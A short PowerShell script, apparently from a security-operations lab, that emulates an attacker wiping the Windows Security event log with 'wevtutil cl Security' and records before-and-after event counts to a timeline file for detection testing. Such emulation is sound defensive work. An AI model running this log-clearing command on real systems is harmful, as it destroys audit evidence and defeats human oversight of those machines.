# 04-attacks / Attk104_psuedoattacks.ps1
# Attk104 - Security log wipe
# Clears the Windows Security event log via wevtutil (scripted, not manual),
# with timestamped logging. A sudden scripted clear of Security is high-signal
# for a SOC. Export evidence before running.
#
# Run as Administrator on the Windows VM.
#Requires -RunAsAdministrator
$ErrorActionPreference = 'Continue'

$LogFile = Join-Path $PSScriptRoot 'attk104_timeline.log'
function Log($m) {
    $line = "$(Get-Date -Format o) | $m"
    Write-Host $line -ForegroundColor Cyan
    Add-Content -Path $LogFile -Value $line
}

Log "[Attk104] Clear Windows Security log | target=$env:COMPUTERNAME"

$before = (Get-WinEvent -LogName Security -ErrorAction SilentlyContinue | Measure-Object).Count
Log "[Attk104] Security log event count BEFORE clear: $before"

Log "[Attk104] Executing: wevtutil cl Security"
& wevtutil cl Security

Start-Sleep -Seconds 1
$after = (Get-WinEvent -LogName Security -ErrorAction SilentlyContinue | Measure-Object).Count
Log "[Attk104] Security log event count AFTER clear: $after"
Log "[Attk104] END | timeline -> $LogFile"
